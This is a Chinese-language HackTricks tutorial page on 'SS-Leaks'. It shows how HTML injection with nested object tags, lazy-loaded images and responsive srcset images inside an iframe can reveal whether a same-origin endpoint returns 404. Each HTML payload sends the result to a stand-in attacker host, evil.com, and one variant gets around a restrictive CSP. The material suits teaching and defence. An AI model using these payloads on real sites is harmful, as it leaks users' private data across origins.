# SS-Leaks

<details>

<summary><strong>从零到英雄学习AWS黑客技术，参加</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>课程！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks上看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>

这是**悬挂标记和XS-Leaks**之间的**混合**。一方面，漏洞允许在与我们将要攻击的页面**同源**的页面中**注入HTML**（但不是JS）。另一方面，我们不会直接**攻击**我们可以注入HTML的页面，而是**另一个页面**。

## 嵌套对象

如果<mark style="color:yellow;">`/api/v1/leaky?secret=a`</mark>端点返回404状态码，则内部`object`会被加载，给<mark style="color:yellow;">`https://evil.com?callback=a`</mark>一个回调，并让我们知道搜索查询`a`没有结果。
```html
<object data="/api/v1/leaky?secret=a">
<object data="https://evil.com?callback=a"></object>
</object>
```
### 懒加载

如果CSP阻止了外部对象怎么办？让我们再试一次以下的CSP：

<mark style="color:yellow;">`Content-Security-Policy: default-src 'self'; img-src *;`</mark>

我们上面的回调`object`不再起作用。我们可以使用图片[懒加载](https://developer.mozilla.org/en-US/docs/Web/Performance/Lazy_loading)来替代！以下图片只会在其可见且距离视口一定距离内时加载。
```html
<object data="/api/v1/leaky?secret=a">
<img src="https://evil.com?callback" loading="lazy">
</object>
```
### 响应式图片

上述技术非常有效，但它依赖于我们的HTML注入位于用户的视口内。

如果注入在屏幕之外，用户没有滚动，我们还能泄露数据吗？当然可以，我们可以使用元素ID和[scroll-to-text-fragment](https://chromestatus.com/feature/4733392803332096)来创建一个强制滚动的URL，但这些依赖于用户互动，并且不允许我们在现实世界场景中实现一致的泄露。理想情况下，我们希望以可靠的方式武器化存储的HTML注入。

引入响应式图片！具体来说，就是图片的`srcset`和`sizes`属性。

{% code overflow="wrap" %}
```html
<object data="/api/v1/leaky?secret=a">
<iframe srcdoc="<img srcset='https://evil.com?callback=1 480w, https://evil.com?callback=0 800w' sizes='(min-width: 1000px) 800px, (max-width 999px) 480px'>" width="1000px">
</object>
```
{% endcode %}

这里有很多内容需要解释。首先，记住内部iframe只有在泄露端点返回404状态码时才会可见。

这很重要，因为我们现在将有条件地从两个不同的URL在iframe中加载图片。使用`sizes`属性，我们可以使用[媒体查询](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_media_queries/Using_media_queries)根据视口大小选择从哪个URL加载图片。

{% code overflow="wrap" %}
```html
<img
srcset='https://evil.com?callback=0 800w, https://evil.com?callback=1 480w'
sizes='(min-width: 1000px) 800px, (max-width 999px) 480px'
>
```
{% endcode %}

因为我们的iframe设置了`width="1000px"`，以下情况会发生：

1. 如果leaky endpoint返回404状态码，iframe会被显示并且宽度为1000px。iframe内的图片符合`(min-width: 1000px)`媒体查询，并从`https://evil.com?callback=0`加载800px的图片。
2. 如果leaky endpoint返回200状态码，iframe将_不会_显示。由于图片不是作为大型iframe的一部分渲染的，它符合`(max-width 999px)`媒体查询，并从`https://evil.com?callback=1`加载480px的图片。

## 参考资料

* [https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks](https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks)

<details>

<summary><strong>从零开始学习AWS hacking，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks**中看到您的**公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的hacking技巧。

</details>
